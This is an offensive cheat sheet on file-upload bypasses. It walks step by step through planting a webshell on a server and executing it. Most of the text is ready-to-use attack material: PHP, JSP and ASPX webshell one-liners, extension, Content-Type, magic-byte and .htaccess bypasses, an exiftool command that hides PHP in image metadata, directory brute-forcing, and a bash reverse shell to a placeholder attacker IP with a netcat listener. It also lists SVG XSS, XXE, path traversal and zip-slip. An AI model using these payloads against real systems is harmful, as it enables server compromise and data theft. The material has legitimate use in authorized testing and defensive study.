File Upload Bypass - Cheat Sheet

Abuse a file-upload feature to plant an executable file (usually a webshell) on
the server, then browse to it for code execution. The game is defeating the
upload filters (extension, content-type, magic bytes, content checks) so a
server-side script lands in a place it will execute.
Replace the placeholders (<...>) with your own values.


Step 1 - Understand the filter, then map the upload path

Upload a normal image first. Find where it's stored (view the img src / response)
and whether the original filename/extension is kept. That URL is where your
shell will live.


Step 2 - The webshell payloads (minimal)

    PHP:   <?php system($_GET['c']); ?>            -> ?c=id
    PHP:   <?php echo shell_exec($_GET['c']); ?>
    JSP:   <% Runtime.getRuntime().exec(request.getParameter("c")); %>
    ASPX:  <% Response.Write(new ActiveXObject... %>  (or use msfvenom .aspx)
    # match the server tech (PHP/JSP/ASPX) - upload for the RIGHT engine.


Step 3 - Extension bypasses

    Alternate PHP extensions (if .php blocked):
        .php3 .php4 .php5 .php7 .phtml .pht .phar .inc .phps
    Case:                 shell.PhP  shell.pHtml
    Double extension:     shell.php.jpg   shell.jpg.php
    Trailing tricks:      shell.php%00.jpg (null)  shell.php.  shell.php%20  shell.php/
    Uncommon that still exec: .phtml is the reliable fallback on Apache
    ASP.NET:  shell.aspx / .asp / .asa / .cer / .aspx;.jpg
    Config override (Apache): upload .htaccess to make .jpg run as PHP:
        AddType application/x-httpd-php .jpg


Step 4 - Content-Type / magic-byte bypasses

    # Content-Type: set the multipart header to image/png (in Burp):
    Content-Type: image/png            (while filename stays shell.php)

    # Magic bytes: prepend a valid file signature so content sniffing passes:
    GIF89a;<?php system($_GET['c']); ?>          # GIF header + PHP
    # or embed PHP in real image metadata (exiftool):
    exiftool -Comment='<?php system($_GET["c"]); ?>' img.jpg -o shell.php.jpg


Step 5 - Find & trigger the shell

    # if renamed/relocated, brute the upload dir:
    ffuf -u http://<target>/uploads/FUZZ -w <wordlist>
    # then execute:
    http://<target>/uploads/shell.php?c=id
    http://<target>/uploads/shell.phtml?c=whoami

    # upgrade to interactive:
    ?c=bash -c 'bash -i >%26 /dev/tcp/<your-ip>/4444 0>%261'   (listener: nc -lvnp 4444)


Step 6 - Other impactful upload bugs (not just RCE)

  - SVG with embedded <script>  -> stored XSS  (upload as .svg)
  - XXE via SVG/DOCX/XML upload  -> file read / SSRF
  - Path traversal in filename: ../../../var/www/html/shell.php -> write outside dir
  - Zip-slip: crafted archive extracts files to ../ paths
  - Pixel flood / huge file      -> DoS
  - Overwrite config/.htaccess by controlling the filename


Common wins checklist
    .phtml on Apache · GIF89a magic bytes + .php · Content-Type spoof ·
    .htaccess AddType trick · double extension · null byte on old stacks ·
    SVG->XSS · traversal in filename


Key idea: a file upload becomes RCE the moment the server both stores a
server-side script and later executes it from that path. Filters try to stop
one of those (extension, content-type, magic bytes) - you bypass whichever they
rely on, land a webshell in an executable directory, and browse to it. When
code execution isn't reachable, uploads still yield XSS (SVG), XXE, or
overwrite bugs.
